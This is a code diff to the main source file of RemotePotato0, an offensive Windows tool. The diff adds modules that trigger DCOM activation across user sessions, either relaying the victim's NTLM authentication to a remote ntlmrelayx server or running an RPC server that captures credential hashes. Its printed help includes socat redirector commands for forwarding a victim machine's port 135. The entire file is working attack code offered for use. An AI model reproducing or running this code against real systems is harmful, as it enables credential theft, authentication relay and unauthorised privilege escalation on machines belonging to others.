@@ -1,15 +1,15 @@
 #include "Windows.h"
 #include "stdio.h"
 #include "HTTPCrossProtocolRelay.h"
+#include "RPCCaptureServer.h"
 #include "RogueOxidResolver.h"
 #include "IStorageTrigger.h"
 #include "RogueOxidResolver_h.h"
 #include "IStandardActivator_h.h"
 #include <system_error>
-#include <versionhelpers.h>
 
 int g_sessionID=-1;
-wchar_t* g_rpc2httpCrossProtocolRelayPort;
+wchar_t* g_rpcRelayServerListeningPort;
 wchar_t* rogueOxidResolverIp;
 wchar_t* rogueOxidResolverPort;
 bool juicyPotatoCompatible;
@@ -18,6 +18,7 @@ BOOL g_SuccessTrigger = FALSE;
 
 DWORD WINAPI ThreadRogueOxidResolver(LPVOID lpParam);
 DWORD WINAPI ThreadHTTPCrossProtocolRelay(LPVOID lpParam);
+DWORD WINAPI ThreadRpcServerCaptureCredsHash(LPVOID lpParam);
 void TriggerDCOM(wchar_t*);
 void TriggerDCOMWithSessionID(wchar_t*);
 void usage();
@@ -27,32 +28,59 @@ typedef NTSTATUS(NTAPI* pRtlGetVersion)(OSVERSIONINFOEX* lpVersionInformation);
 
 struct THREAD_PARAMETERS
 {
-	wchar_t* remoteIpRelay;
-	wchar_t* remotePortRelay;
-	wchar_t* rogueOxidResolverIp;
-	wchar_t* hTTPCrossProtocolRelayPort;
-	wchar_t* rogueOxidResolverPort;
+	wchar_t* remoteHTTPRelayServerIp;
+	wchar_t* remoteHTTPRelayServerPort;
+	wchar_t* rpcServerIpReflection;
+	wchar_t* rpcServerPortReflection;
+	wchar_t* rpcRelayServerListeningPort;
 };
 
 
 int wmain(int argc, wchar_t** argv)
 {
-	int cnt = 1;
-	wchar_t defaultRemotePortRelay[] = L"80";
+	int fModule = -1;
+	wchar_t defaultRemoteHTTPRelayServerPort[] = L"80";
 	wchar_t defaultRogueOxidResolverIp[] = L"127.0.0.1";
-	wchar_t defaultHTTPCrossProtocolrelayPort[] = L"9997";
+	wchar_t defaultRogueOxidResolverPort[] = L"9999";
+	wchar_t defaultRpcRelayServerListeningPort[] = L"9997";
 	wchar_t defaultClsid[] = L"{5167B42F-C111-47A1-ACC4-8EABE61B0B54}";
-	wchar_t* remoteIpRelay = NULL;
-	wchar_t* remotePortRelay = defaultRemotePortRelay;
-	wchar_t* httpCrossProtocolrelayPort = defaultHTTPCrossProtocolrelayPort;
+	wchar_t* remoteHTTPRelayServerIp = NULL;
+	wchar_t* remoteHTTPRelayServerPort = defaultRemoteHTTPRelayServerPort;
+	wchar_t* rpcRelayServerListeningPort = defaultRpcRelayServerListeningPort;
 	wchar_t* clsid = defaultClsid;
 	rogueOxidResolverIp = defaultRogueOxidResolverIp;
+	rogueOxidResolverPort = defaultRogueOxidResolverPort;
 
+	int cnt = 1;
 	while ((argc > 1) && (argv[cnt][0] == '-'))
 	{
 
 		switch (argv[cnt][1])
 		{
+
+		case 'm':
+			++cnt;
+			--argc;
+			fModule = _wtoi(argv[cnt]);
+			break;
+
+		case 'r':
+			++cnt;
+			--argc;
+			remoteHTTPRelayServerIp = argv[cnt];
+			break;
+
+		case 't':
+			++cnt;
+			--argc;
+			remoteHTTPRelayServerPort = argv[cnt];
+			break;
+
+		case 'l':
+			++cnt;
+			--argc;
+			rpcRelayServerListeningPort = argv[cnt];
+			break;
 
 		case 's':
 			++cnt;
@@ -66,34 +94,16 @@ int wmain(int argc, wchar_t** argv)
 			clsid = argv[cnt];
 			break;
 
-		case 'l':
-			++cnt;
-			--argc;
-			httpCrossProtocolrelayPort = argv[cnt];
-			break;
-
-		case 'm':
-			++cnt;
-			--argc;
-			remotePortRelay = argv[cnt];
-			break;
-
 		case 'p':
 			++cnt;
 			--argc;
 			rogueOxidResolverPort = argv[cnt];
 			break;
 
-		case 'k':
+		case 'x':
 			++cnt;
 			--argc;
 			rogueOxidResolverIp = argv[cnt];
-			break;
-
-		case 'r':
-			++cnt;
-			--argc;
-			remoteIpRelay = argv[cnt];
 			break;
 
 		case 'h':
@@ -108,41 +118,67 @@ int wmain(int argc, wchar_t** argv)
 		++cnt;
 		--argc;
 	}
-
-	if (rogueOxidResolverPort == NULL || remoteIpRelay == NULL)
-	{
+	
+	if (fModule == -1) {
 		usage();
-		exit(-1);
+		exit(-1); 
 	}
-
-	if (IsJuicyPotatoCompatible()) {
-		printf("[*] Detected a Windows Server version compatible with JuicyPotato. RogueOxidResolver can be run locally on 127.0.0.1\n");
-		juicyPotatoCompatible = true;
-	}
-	else
-	{
-		rogueOxidResolverIp = remoteIpRelay;
-		printf("[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on %S to your victim machine on port %S\n", remoteIpRelay, rogueOxidResolverPort);
-		printf("[*] Example Network redirector: \n\tsudo socat TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:%S\n", rogueOxidResolverPort);
-		juicyPotatoCompatible = false;
-	}
-
-	g_rpc2httpCrossProtocolRelayPort = httpCrossProtocolrelayPort;
-	printf("[*] Starting the NTLM relay attack, launch ntlmrelayx on %S!!\n", remoteIpRelay);
-	CreateThread(NULL, 0, ThreadRogueOxidResolver, (LPVOID)rogueOxidResolverPort, 0, NULL);
+		
 	THREAD_PARAMETERS threads_params = {};
-	threads_params.remoteIpRelay = remoteIpRelay;
-	threads_params.remotePortRelay = remotePortRelay;
-	threads_params.rogueOxidResolverIp = defaultRogueOxidResolverIp;
-	threads_params.hTTPCrossProtocolRelayPort = httpCrossProtocolrelayPort;
-	threads_params.rogueOxidResolverPort = rogueOxidResolverPort;
+	threads_params.remoteHTTPRelayServerIp = remoteHTTPRelayServerIp;
+	threads_params.remoteHTTPRelayServerPort = remoteHTTPRelayServerPort;
+	threads_params.rpcServerIpReflection = defaultRogueOxidResolverIp;
+	threads_params.rpcServerPortReflection = rogueOxidResolverPort;
+	threads_params.rpcRelayServerListeningPort = rpcRelayServerListeningPort;
+	HANDLE hThreadServer;
 
-	HANDLE hThreadCrossProtocolRelay = CreateThread(NULL, 0, ThreadHTTPCrossProtocolRelay, (LPVOID)& threads_params, 0, NULL);
-	if(g_sessionID == -1)
-		TriggerDCOM(clsid);
-	else
-		TriggerDCOMWithSessionID(clsid);
-	WaitForSingleObject(hThreadCrossProtocolRelay, INFINITE);
+	if (fModule == 0 || fModule == 2) {
+		g_rpcRelayServerListeningPort = rpcRelayServerListeningPort;
+		CreateThread(NULL, 0, ThreadRogueOxidResolver, (LPVOID)rogueOxidResolverPort, 0, NULL);
+		if (IsJuicyPotatoCompatible()) {
+			printf("[*] Detected a Windows Server version compatible with JuicyPotato. RogueOxidResolver can be run locally on 127.0.0.1\n");
+			juicyPotatoCompatible = true;
+		}
+		else
+		{
+			if (rogueOxidResolverIp == defaultRogueOxidResolverIp) {
+				printf("[!] Detected a Windows Server version not compatible with JuicyPotato, you cannot run the RogueOxidResolver on 127.0.0.1. RogueOxidResolver must be run remotely.\n");
+				printf("[!] Example Network redirector: \n\tsudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:%S\n", rogueOxidResolverPort);
+				exit(-1);
+			}
+			printf("[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on %S to your victim machine on port %S\n", remoteHTTPRelayServerIp, rogueOxidResolverPort);
+			printf("[*] Example Network redirector: \n\tsudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:%S\n", rogueOxidResolverPort);
+			juicyPotatoCompatible = false;
+		}
+	}
+	else {
+		// using the system oxid resolver to forge rpc packet template
+		threads_params.rpcServerIpReflection = (wchar_t*)L"127.0.0.1";
+		threads_params.rpcServerPortReflection = (wchar_t*)L"135";
+	}
+
+	if (fModule == 0 || fModule == 1) {
+		if (remoteHTTPRelayServerIp == NULL)
+		{
+			printf("[!] Remote HTTP Relay server ip must be set in module 0 and 1, set it with the -r flag.\n");
+			exit(-1);
+		}
+		printf("[*] Starting the NTLM relay attack, launch ntlmrelayx on %S!!\n", remoteHTTPRelayServerIp);
+		hThreadServer = CreateThread(NULL, 0, ThreadHTTPCrossProtocolRelay, (LPVOID)& threads_params, 0, NULL);
+	}
+	else {
+		printf("[*] Starting the RPC server to capture the credentials hash from the user authentication!!\n");
+		hThreadServer = CreateThread(NULL, 0, ThreadRpcServerCaptureCredsHash, (LPVOID)& threads_params, 0, NULL);
+	}
+
+	if (fModule == 0 || fModule == 2) {
+		if (g_sessionID == -1)
+			TriggerDCOM(clsid);
+		else
+			TriggerDCOMWithSessionID(clsid);
+	}
+
+	WaitForSingleObject(hThreadServer, INFINITE);
 	return 0;
 }
 
@@ -155,11 +191,18 @@ DWORD WINAPI ThreadRogueOxidResolver(LPVOID lpParam)
 	return 0;
 }
 
-DWORD WINAPI ThreadHTTPCrossProtocolRelay(LPVOID lpParam) {
+DWORD WINAPI ThreadRpcServerCaptureCredsHash(LPVOID lpParam) {
 	THREAD_PARAMETERS* thread_params = (THREAD_PARAMETERS*)lpParam;
-	DoHTTPCrossProtocolRelay(thread_params->remoteIpRelay, thread_params->remotePortRelay, thread_params->rogueOxidResolverIp, thread_params->rogueOxidResolverPort, thread_params->hTTPCrossProtocolRelayPort);
+	DoRpcServerCaptureCredsHash(thread_params->rpcServerIpReflection, thread_params->rpcServerPortReflection, thread_params->rpcRelayServerListeningPort);
 	return 0;
 }
+
+DWORD WINAPI ThreadHTTPCrossProtocolRelay(LPVOID lpParam) {
+	THREAD_PARAMETERS* thread_params = (THREAD_PARAMETERS*)lpParam;
+	DoHTTPCrossProtocolRelay(thread_params->remoteHTTPRelayServerIp, thread_params->remoteHTTPRelayServerPort, thread_params->rpcServerIpReflection, thread_params->rpcServerPortReflection, thread_params->rpcRelayServerListeningPort);
+	return 0;
+}
+
 void TriggerDCOM(wchar_t* clsid_string)
 {
 	CoInitialize(NULL);
@@ -251,7 +294,7 @@ void TriggerDCOMWithSessionID(wchar_t* clsid_string)
 		if (status == CO_E_BAD_PATH)
 			printf("[!] Error. CLSID %S not found. Bad path to object.\n", clsid_string);
 		else
-			printf("[!] Error. Trigger DCOM failed with status: 0x%x\n", status);
+			printf("[!] Error. Trigger DCOM failed with status: 0x%x - %s\n", status, message.c_str());
 		exit(-1);
 	}
 	//debug
@@ -274,14 +317,22 @@ void usage()
 {
 	printf("\n\n\tRemotePotato0\n\t@splinter_code & @decoder_it\n\n\n\n");
 	printf("Mandatory args: \n"
-		"-r remote relay host\n"
-		"-p Rogue Oxid Resolver port\n"
+		"-m module\n"
+		"\tAllowed values:\n"
+		"\t0 - Rpc2Http cross protocol relay server + potato trigger (default)\n"
+		"\t1 - Rpc2Http cross protocol relay server\n"
+		"\t2 - Rpc capture (hash) server + potato trigger\n"
+		"\t3 - Rpc capture (hash) server\n"
 	);
+
 	printf("\n\n");
-	printf("Optional args: \n"
-		"-s Cross session activation (default disabled)\n"
-		"-l local listener port (Default 9997)\n"
-		"-m remote relay port (Default 80)\n"
-		"-c clsid (Default {5167B42F-C111-47A1-ACC4-8EABE61B0B54})\n"
+	printf("Other args: (someone could be mandatory and/or optional based on the module you use) \n"
+		"-r Remote HTTP relay server ip\n"
+		"-t Remote HTTP relay server port (Default 80)\n"
+		"-x Rogue Oxid Resolver ip (default 127.0.0.1)\n"
+		"-p Rogue Oxid Resolver port (default 9999)\n"
+		"-l RPC Relay server listening port (Default 9997)\n"
+		"-s Session id for the Cross Session Activation attack (default disabled)\n"
+		"-c CLSID (Default {5167B42F-C111-47A1-ACC4-8EABE61B0B54})\n"
 	);
 }
